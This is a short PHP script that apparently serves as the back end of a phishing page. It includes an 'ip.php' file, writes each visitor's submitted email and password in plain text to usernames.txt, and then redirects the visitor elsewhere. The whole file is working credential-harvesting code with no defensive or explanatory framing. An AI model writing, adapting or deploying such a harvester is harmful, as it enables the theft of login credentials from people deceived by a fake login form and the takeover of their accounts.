<?php
include 'ip.php';

file_put_contents("usernames.txt", "Email: " . $_POST['email'] . "   Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: <REDIRECT>');
exit();

